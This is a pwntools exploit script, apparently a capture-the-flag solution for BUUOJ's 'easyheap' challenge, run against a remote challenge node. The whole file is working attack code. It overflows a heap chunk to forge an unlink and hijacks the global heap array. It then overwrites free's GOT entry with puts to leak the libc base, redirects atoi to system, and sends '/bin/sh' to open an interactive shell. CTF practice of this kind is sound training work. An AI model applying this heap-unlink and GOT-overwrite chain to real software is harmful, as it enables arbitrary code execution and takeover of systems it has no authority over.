from pwn import *

context.log_level = 'debug'
# io = process('easyheap')
io = remote('node4.buuoj.cn', 28915)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')
elf = ELF('easyheap')
heaparray = 0x6020E0
magic = 0x6020C0
free_got = elf.got['free']
puts_plt = elf.plt['puts']
atoi_got = elf.got['atoi']

def create(size, content):
	io.sendlineafter('Your choice :', '1')
	io.sendlineafter('Size of Heap : ', str(size))
	io.sendafter('Content of heap:', content)


def edit(index, size, content):
	io.sendlineafter('Your choice :', '2')
	io.sendlineafter('Index :', str(index))
	io.sendlineafter('Size of Heap : ', str(size))
	io.sendafter('Content of heap : ', content)


def delete(index):
    io.sendlineafter('Your choice :', '3')
    io.sendlineafter('Index :', str(index))

def backdoor():
	io.sendlineafter('Your choice :', '4869')
	io.recv()


def pwn():
	create(0x20, 'a' * 0x10)								# chunk0 fast
	create(0x80, 'b' * 0x80)								# chunk1 unsorted
	payload = p64(0) + p64(0x21) 							# fake prev_size size
	payload += p64(heaparray - 0x18) + p64(heaparray - 0x10)# fake fd bk 
	payload += p64(0x20) + p64(0x90)						# fake prev_size size
	edit(0, 0x30, payload)									# overflow
	delete(1)												# unlink
	edit(0, 0x30, cyclic(0x18) + p64(free_got) + p64(atoi_got) + p64(atoi_got))
	edit(0, 8, p64(puts_plt))								# change free to puts
	delete(1)
	libc_base = u64(io.recvn(6).ljust(8, b'\x00')) - libc.symbols['atoi']
	log.success('libc_base: ' + hex(libc_base))
	system_addr = libc_base + libc.symbols['system']
	edit(2, 8, p64(system_addr))
	io.sendlineafter('Your choice :', b'/bin/sh\x00')
	io.interactive()


if __name__ == '__main__':
	pwn()

